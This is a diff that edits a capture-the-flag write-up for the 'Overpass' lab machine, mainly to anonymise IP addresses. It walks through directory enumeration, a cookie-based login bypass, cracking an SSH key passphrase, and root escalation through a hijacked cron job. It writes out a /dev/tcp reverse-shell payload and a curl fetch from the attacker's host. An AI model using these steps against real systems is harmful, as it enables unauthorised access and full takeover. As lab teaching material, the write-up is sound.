@@ -32,12 +32,12 @@ The landing page looks really plain and basic. We can discover two other links d
 ### Gobuster
 To see if there is more to discover, I ran a gobuster directory enumeration scan, since just an offline password manager is most likely not going to be the attack vector we are looking for.
 ```
-user@parrot ~ $ gobuster dir -u 10.10.166.254 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+user@parrot ~ $ gobuster dir -u <IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.166.254
+[+] Url:                     <IP>
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
@@ -65,7 +65,7 @@ Starting gobuster in directory enumeration mode
 ```
 
 ## Bypassing the credential login
-The gobuster scan shows that there is an admin page, `<IP>/admin`. It contains a simple login form. Before trying to exploit it, looking into the source code is always a good idea. The source code contains two important information. First, within the html <head>, the authors include a javascript file, "login.js"(`<script src="/login.js"></script>`). Second, the html <body> calls a function named "onLoad()" whenever the body gets loaded (`<body onload="onLoad()">`). We might be able to work with that. By looking at `<IP>/login.js`, we find the function definition for `onLoad()` and also a vulnerability, which allows us to log in without knowing any credentials.
+The gobuster scan shows that there is an admin page, `<IP>/admin`. It contains a simple login form. Before trying to exploit it, looking into the source code is always a good idea. The source code contains two important information. First, within the html <head>, the authors include a javascript file, **login.js**(`<script src="/login.js"></script>`). Second, the html <body> calls a function named "onLoad()" whenever the body gets loaded (`<body onload="onLoad()">`). We might be able to work with this. By looking at `<IP>/login.js`, we find the function definition for `onLoad()` and also a vulnerability, which allows us to log in without knowing any credentials.
 ```
 function onLoad() {
     document.querySelector("#loginForm").addEventListener("submit", function (event) {
@@ -91,7 +91,7 @@ async function login() {
     }
 }
 ```
-As you can see, the `onLoad()` function registers an event-listener for the login-form. When someone tries to log in, the related function gets executed, calling `login()`, which is vulnerable. Why? Because of the following lines:
+As you can see, the `onLoad()` function registers an event-listener for the login form. When someone tries to log in, the related function gets executed, calling `login()`, which is vulnerable. Why? Because of the following lines:
 ```
  if (statusOrCookie === "Incorrect credentials") {
         loginStatus.textContent = "Incorrect Credentials"
@@ -101,20 +101,20 @@ As you can see, the `onLoad()` function registers an event-listener for the logi
         window.location = "/admin"
     }
 ```
-Essentially, it seems if we would successfully log in with correct credentials, a cookie gets set, but we do not need to pass the login-check. We can just add a cookie named "SessionToken" on our own.
+Essentially, it seems if we would successfully log in with correct credentials, a cookie gets set, but we do not need to pass the login-check to achieve this. We can just add a cookie named "SessionToken" manually.
 
 ![sessiontoken](images/sessiontoken.png)
 
-It looks like we passed the check!
+After refreshing the page, it looks like we passed the check!
 
 ![loggedin](images/loggedin.png)
 
 ## SSH Access
-On the current page, we can clearly see a private SSH-key. The text above it indicates that it is related to a person named **james** and it seems to be encrypted.
-To verify, copy the SSH-key onto the attacker machine and try to login on the target via SSH (port(22) is open, we already discovered that earlier). Keep in mind to change the files permission, otherwise we won't be able to use it.
+On the current page, we can clearly see a private SSH-key. The text above indicates it is related to a person named **James** and it seems to be encrypted.
+To verify, copy the SSH-key onto the attacker machine and try to login on the target via SSH (port(22) is open, we already discovered that earlier). Keep in mind to change the files permissions, otherwise we won't be able to use it.
 ```
 user@parrot ~/writeup/overpass $ chmod 600 id_rsa 
-user@parrot ~/writeup/overpass $ ssh james@10.10.166.254 -i id_rsa
+user@parrot ~/writeup/overpass $ ssh james@<IP> -i id_rsa
 Enter passphrase for key 'id_rsa': 
 ```
 
@@ -134,9 +134,9 @@ Session completed.
 ```
 The passphrase seems to be **james13**.
 
-In theory, we should be able to login now. Provide **james13** as the passphrase.
+In theory, we should be able to log in now. Provide **james13** as the passphrase.
 ```
-user@parrot ~/writeup/overpass $ ssh james@10.10.166.254 -i id_rsa 
+user@parrot ~/writeup/overpass $ ssh james@<IP> -i id_rsa 
 Enter passphrase for key 'id_rsa': 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
 
@@ -148,7 +148,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
 
   System load:  0.0                Processes:           88
   Usage of /:   22.3% of 18.57GB   Users logged in:     0
-  Memory usage: 16%                IP address for eth0: 10.10.166.254
+  Memory usage: 16%                IP address for eth0: <IP>
   Swap usage:   0%
 
 
@@ -185,8 +185,8 @@ total 48
 james@overpass-prod:~$ cat .overpass 
 ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.james@overpass-prod:~$ 
 ```
-The output already looks like an encrypted password. The content of todo.txt confirms this.
-At this point, we have to use the password manager. After looking at the source code, it seems like we only have to create an .overpass file in the home-directory and after putting the password into it, we can decrypt it using the password manager.
+The output for .overpass already looks like an encrypted password. The content of todo.txt confirms that.
+At this point, we have to use the password manager. After looking at the source code, it seems like we only have to create an .overpass file in our home-directory and after putting the password into it, we can decrypt it using the password manager.
 ```
 user@parrot ~/writeup/overpass $ echo ",LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN." > ~/.overpass
 
@@ -202,7 +202,7 @@ Choose an option:       4
 m        saydrawnlyingpicture
 user@parrot ~/writeup/overpass $ 
 ```
-**saydrawnlyingpicture** is the password for the user james. To confirm this, one could try to re-establish the SSH connection, but this time with the actual password instead of the private SSH-key. Or in our case, trying `sudo -l` is enough for us to validate.
+**saydrawnlyingpicture** is the password for the user james. To confirm this, one could try to re-establish the SSH connection, but this time with the actual password instead of the private SSH-key. Or in our case, trying `sudo -l` is enough to validate.
 ```
 james@overpass-prod:~$ sudo -l
 [sudo] password for james: 
@@ -212,8 +212,9 @@ james@overpass-prod:~$
 In case we would input the wrong password, it would prompt us *Sorry, try again!*, which is not happening. This means, we cannot use `sudo -l`, but we made sure that the password we found out is correct.
 
 ### Privilege escalation
-Lets start by getting [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) on the target. It helps a lot to determine possible attacking vectors. Just download the linpeas.sh on the attacker machine, start a http-server with `python3 -m http.server 8080`and curl it on the target with `curl attackerip:8080/linpeas.sh -o linpeas.sh`. After running and going through the output, this catched my attention:
-`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash `. The target does run a cronjob every minute as *root*. It curls a file (buildscript.sh) from a specific IP and executes it. "overpass.thm" is basically just a hostname which is mapped to a specific IP-address. If we are able to change the corresponding IP-address to one we control, we could upload whatever we want and it would get executed, as long as we keep the path correct (<OUR-IP>/downloads/src/buildscript.sh). The necessary information about these hostnames are within /etc/hosts and luckily, the user james has write-access to it! 
+Lets start by getting [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) on the target. It helps a lot to determine possible attack vectors. Just download the linpeas.sh on the attacker machine, start a http-server with `python3 -m http.server 8080` and curl it on the target with `curl <OUR-IP>:8080/linpeas.sh -o linpeas.sh`. After running and going through the output, this catched my attention:
+`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash `. The target does run a cronjob every minute as *root*. It curls a file (buildscript.sh) from a specific IP and executes it. "overpass.thm" is basically just a hostname which is mapped to a specific IP-address. If we are able to change the corresponding IP-address to one we control, we could upload whatever we want and it would get executed, as long as we keep the path correct (<OUR-IP>/downloads/src/buildscript.sh). The necessary information about these hostnames are within */etc/hosts* and luckily, the user james has write-access to it!
+
 1. edit the associated IP for overpass.thm - `vim /etc/hosts`
 ```
 127.0.0.1 localhost
@@ -231,11 +232,11 @@ ff02::2 ip6-allrouters
 ```
 user@parrot /tmp $ mkdir -p downloads/src   
 user@parrot /tmp $ cd downloads/src 
-user@parrot /tmp/downloads/src $ echo "/bin/bash -i >& /dev/tcp/10.9.251.98/9001 0>&1" > buildscript.sh
+user@parrot /tmp/downloads/src $ echo "/bin/bash -i >& /dev/tcp/<OUR-IP>/9001 0>&1" > buildscript.sh
 user@parrot /tmp/downloads/src $ 
 ```
 
-3. start up a python3 server
+3. start up a python3 HTTP-server
 ```
 user@parrot /tmp $ sudo python3 -m http.server 80
 ```
